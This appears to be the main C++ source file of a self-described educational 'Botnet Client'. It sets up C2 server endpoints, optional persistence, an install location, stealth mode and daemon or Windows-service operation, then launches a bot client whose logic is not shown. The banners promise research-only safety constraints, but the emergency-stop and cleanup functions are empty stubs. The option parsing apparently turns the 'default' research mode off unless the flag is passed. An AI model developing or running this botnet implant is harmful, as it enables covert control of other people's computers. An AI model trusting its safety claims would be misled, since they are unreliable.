#include <iostream>
#include <memory>
#include <csignal>
#include <boost/asio.hpp>
#include <boost/program_options.hpp>
#include "bot_client.h"
#include "../../common/utils/platform_utils.h"

// Global variables for signal handling
std::unique_ptr<botnet::client::BotClient> g_bot_client;
boost::asio::io_context* g_io_context = nullptr;

/**
 * @brief Signal handler for graceful shutdown
 * 
 * Cross-platform signal handling using standard C++ and Boost.
 * Works identically on Windows, Linux, and macOS.
 */
void SignalHandler(int signal) {
    std::cout << "\n[INFO] Received signal " << signal << ", initiating graceful shutdown..." << std::endl;
    
    if (g_bot_client) {
        g_bot_client->Shutdown();
    }
    
    if (g_io_context) {
        g_io_context->stop();
    }
}

/**
 * @brief Setup cross-platform signal handlers
 */
void SetupSignalHandlers() {
    std::signal(SIGINT, SignalHandler);   // Ctrl+C
    std::signal(SIGTERM, SignalHandler);  // Termination request
    
#ifndef PLATFORM_WINDOWS
    std::signal(SIGUSR1, SignalHandler);  // User-defined signal (emergency stop)
    std::signal(SIGHUP, SignalHandler);   // Hangup signal
#endif
}

/**
 * @brief Print usage information
 */
void PrintUsage(const boost::program_options::options_description& desc) {
    std::cout << "Botnet Client - Educational Research Tool\n\n";
    std::cout << "⚠️  FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY ⚠️\n\n";
    std::cout << "Usage: botnet-client [options]\n\n";
    std::cout << desc << std::endl;
    std::cout << "\nExamples:\n";
    std::cout << "  # Basic usage with research mode\n";
    std::cout << "  botnet-client --c2-server https://research-c2.local:8443 --research-mode\n\n";
    std::cout << "  # Load configuration from file\n";
    std::cout << "  botnet-client --config config.json\n\n";
    std::cout << "  # Emergency stop mode\n";
    std::cout << "  botnet-client --emergency-stop\n\n";
    std::cout << "Remember: Use responsibly and ethically!\n";
}

/**
 * @brief Parse command line arguments
 */
botnet::client::BotClient::Configuration ParseCommandLine(int argc, char* argv[]) {
    namespace po = boost::program_options;
    
    botnet::client::BotClient::Configuration config;
    
    // Default research mode configuration
    config.research_mode = true;
    config.enable_stealth = false;  // Disabled in research mode
    config.hide_from_process_list = false;
    config.anti_analysis = false;
    config.max_runtime = std::chrono::hours(4);  // 4 hour safety limit
    
    po::options_description desc("Allowed options");
    desc.add_options()
        ("help,h", "Show this help message")
        ("version,v", "Show version information")
        ("config,c", po::value<std::string>(), "Configuration file path")
        ("c2-server", po::value<std::vector<std::string>>()->multitoken(), 
         "C2 server endpoints (can specify multiple)")
        ("client-id", po::value<std::string>(), "Unique client identifier")
        ("research-mode", po::bool_switch(&config.research_mode), 
         "Enable research mode (default: true)")
        ("research-session", po::value<std::string>(), "Research session ID")
        ("compliance-token", po::value<std::string>(), "Ethical compliance token")
        ("heartbeat-interval", po::value<int>()->default_value(60), 
         "Heartbeat interval in seconds")
        ("log-level", po::value<std::string>()->default_value("INFO"), 
         "Logging level (DEBUG, INFO, WARN, ERROR)")
        ("enable-persistence", po::bool_switch(&config.enable_persistence), 
         "Enable persistence mechanisms")
        ("install-location", po::value<std::string>(), "Installation directory")
        ("max-runtime", po::value<int>()->default_value(4), 
         "Maximum runtime in hours (safety limit)")
        ("emergency-stop", "Trigger emergency stop for all instances")
        ("cleanup-only", "Remove persistence and exit")
        ("stealth-mode", po::bool_switch(&config.enable_stealth), 
         "Enable stealth capabilities (disabled in research mode)")
        ("daemon", "Run as daemon/service")
        ("dry-run", "Validate configuration without connecting");
    
    po::variables_map vm;
    
    try {
        po::store(po::parse_command_line(argc, argv, desc), vm);
        po::notify(vm);
        
        if (vm.count("help")) {
            PrintUsage(desc);
            std::exit(0);
        }
        
        if (vm.count("version")) {
            std::cout << "Botnet Client v1.0.0\n";
            std::cout << "Platform: " << botnet::platform::PlatformUtils::GetPlatformName() << "\n";
            std::cout << "Architecture: " << botnet::platform::PlatformUtils::GetArchitecture() << "\n";
            std::cout << "Built: " << __DATE__ << " " << __TIME__ << "\n";
            std::cout << "Research Mode: Enabled by default\n";
            std::exit(0);
        }
        
        // Handle emergency stop
        if (vm.count("emergency-stop")) {
            std::cout << "[INFO] Emergency stop triggered - sending stop signal to all instances\n";
            // Implementation for emergency stop would go here
            std::exit(0);
        }
        
        // Handle cleanup only
        if (vm.count("cleanup-only")) {
            std::cout << "[INFO] Cleanup mode - removing persistence and exiting\n";
            // Implementation for cleanup would go here
            std::exit(0);
        }
        
        // Parse configuration
        if (vm.count("config")) {
            std::cout << "[INFO] Loading configuration from: " << vm["config"].as<std::string>() << std::endl;
            // Configuration loading would be implemented here
        }
        
        if (vm.count("c2-server")) {
            config.c2_endpoints = vm["c2-server"].as<std::vector<std::string>>();
        } else {
            // Default research endpoints
            config.c2_endpoints = {"https://research-c2.local:8443"};
        }
        
        if (vm.count("client-id")) {
            config.client_id = vm["client-id"].as<std::string>();
        } else {
            // Generate unique client ID
            config.client_id = "research-client-" + 
                botnet::platform::PlatformUtils::GetSystemFingerprint().substr(0, 8);
        }
        
        if (vm.count("research-session")) {
            config.research_session_id = vm["research-session"].as<std::string>();
        }
        
        if (vm.count("compliance-token")) {
            config.compliance_token = vm["compliance-token"].as<std::string>();
        }
        
        config.heartbeat_interval = std::chrono::seconds(vm["heartbeat-interval"].as<int>());
        config.log_level = vm["log-level"].as<std::string>();
        config.max_runtime = std::chrono::hours(vm["max-runtime"].as<int>());
        
        if (vm.count("install-location")) {
            config.install_location = vm["install-location"].as<std::string>();
        }
        
        // Validate research mode constraints
        if (config.research_mode) {
            std::cout << "[INFO] Research mode enabled - applying safety constraints\n";
            config.enable_stealth = false;           // Force disable stealth
            config.hide_from_process_list = false;   // Force disable hiding
            config.anti_analysis = false;            // Force disable anti-analysis
            
            // Ensure we have research identifiers
            if (config.research_session_id.empty()) {
                config.research_session_id = "default-research-session";
                std::cout << "[WARN] No research session ID provided, using default\n";
            }
        }
        
        // Dry run mode
        if (vm.count("dry-run")) {
            std::cout << "[INFO] Dry run mode - validating configuration\n";
            std::cout << "Client ID: " << config.client_id << "\n";
            std::cout << "C2 Endpoints: ";
            for (const auto& endpoint : config.c2_endpoints) {
                std::cout << endpoint << " ";
            }
            std::cout << "\nResearch Mode: " << (config.research_mode ? "Enabled" : "Disabled") << "\n";
            std::cout << "Max Runtime: " << config.max_runtime.count() << " hours\n";
            std::cout << "Configuration validation successful!\n";
            std::exit(0);
        }
        
    } catch (const po::error& e) {
        std::cerr << "[ERROR] Command line parsing error: " << e.what() << std::endl;
        std::cerr << "Use --help for usage information." << std::endl;
        std::exit(1);
    }
    
    return config;
}

/**
 * @brief Display startup banner with ethical reminders
 */
void DisplayStartupBanner(const botnet::client::BotClient::Configuration& config) {
    std::cout << "\n";
    std::cout << "╔══════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                    BOTNET CLIENT v1.0.0                     ║\n";
    std::cout << "║              Educational Research Tool                       ║\n";
    std::cout << "╠══════════════════════════════════════════════════════════════╣\n";
    std::cout << "║  ⚠️  FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY  ⚠️          ║\n";
    std::cout << "║                                                              ║\n";
    std::cout << "║  This software is designed for:                             ║\n";
    std::cout << "║  • Cybersecurity education and training                     ║\n";
    std::cout << "║  • Authorized penetration testing                           ║\n";
    std::cout << "║  • Academic research with IRB approval                      ║\n";
    std::cout << "║  • Security tool development and testing                    ║\n";
    std::cout << "║                                                              ║\n";
    std::cout << "║  UNAUTHORIZED USE IS STRICTLY PROHIBITED                    ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════════╝\n";
    std::cout << "\n";
    
    std::cout << "[INFO] Platform: " << botnet::platform::PlatformUtils::GetPlatformName() 
              << " (" << botnet::platform::PlatformUtils::GetArchitecture() << ")\n";
    std::cout << "[INFO] Client ID: " << config.client_id << "\n";
    std::cout << "[INFO] Research Mode: " << (config.research_mode ? "ENABLED" : "DISABLED") << "\n";
    
    if (config.research_mode) {
        std::cout << "[INFO] Research Session: " << config.research_session_id << "\n";
        std::cout << "[INFO] Safety Constraints: Active\n";
        std::cout << "[INFO] Max Runtime: " << config.max_runtime.count() << " hours\n";
    }
    
    std::cout << "[INFO] C2 Endpoints: ";
    for (const auto& endpoint : config.c2_endpoints) {
        std::cout << endpoint << " ";
    }
    std::cout << "\n\n";
}

/**
 * @brief Main entry point - single codebase for all platforms
 */
int main(int argc, char* argv[]) {
    try {
        std::cout << "[INFO] Starting Botnet Client...\n";
        
        // Parse command line arguments
        auto config = ParseCommandLine(argc, argv);
        
        // Display startup information
        DisplayStartupBanner(config);
        
        // Check if running with appropriate privileges
        if (botnet::platform::PlatformUtils::IsRunningAsAdmin() && config.research_mode) {
            std::cout << "[WARN] Running with elevated privileges in research mode\n";
            std::cout << "[WARN] Consider running with normal user privileges for safety\n";
        }
        
        // Initialize Boost.Asio IO context
        boost::asio::io_context io_context;
        g_io_context = &io_context;
        
        // Setup signal handlers for graceful shutdown
        SetupSignalHandlers();
        
        // Create bot client instance
        g_bot_client = std::make_unique<botnet::client::BotClient>(io_context);
        
        // Initialize the bot client
        std::cout << "[INFO] Initializing bot client...\n";
        if (!g_bot_client->Initialize(config)) {
            std::cerr << "[ERROR] Failed to initialize bot client\n";
            return 1;
        }
        
        std::cout << "[INFO] Bot client initialized successfully\n";
        
        // Start the bot client in a separate thread
        std::thread bot_thread([&]() {
            try {
                g_bot_client->Run();
            } catch (const std::exception& e) {
                std::cerr << "[ERROR] Bot client exception: " << e.what() << std::endl;
            }
        });
        
        // Run the IO context (this will block until stop() is called)
        std::cout << "[INFO] Starting main event loop...\n";
        io_context.run();
        
        // Wait for bot thread to complete
        if (bot_thread.joinable()) {
            bot_thread.join();
        }
        
        std::cout << "[INFO] Bot client shutdown complete\n";
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Unhandled exception: " << e.what() << std::endl;
        return 1;
    } catch (...) {
        std::cerr << "[ERROR] Unknown exception occurred\n";
        return 1;
    }
    
    return 0;
}

/**
 * @brief Platform-specific entry points (Windows)
 */
#ifdef PLATFORM_WINDOWS
#include <windows.h>

// Windows service entry point
SERVICE_STATUS_HANDLE g_service_status_handle = nullptr;
SERVICE_STATUS g_service_status = {};

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    // Windows service implementation would go here
    // For now, just call the normal main function
    char** char_argv = new char*[argc];
    for (DWORD i = 0; i < argc; ++i) {
        // Convert TCHAR to char (simplified)
        size_t len = wcslen(argv[i]) + 1;
        char_argv[i] = new char[len];
        wcstombs(char_argv[i], argv[i], len);
    }
    
    main(argc, char_argv);
    
    // Cleanup
    for (DWORD i = 0; i < argc; ++i) {
        delete[] char_argv[i];
    }
    delete[] char_argv;
}

// Windows service control handler
void WINAPI ServiceCtrlHandler(DWORD ctrl_code) {
    switch (ctrl_code) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            if (g_bot_client) {
                g_bot_client->Shutdown();
            }
            g_service_status.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_service_status_handle, &g_service_status);
            break;
    }
}

#endif // PLATFORM_WINDOWS
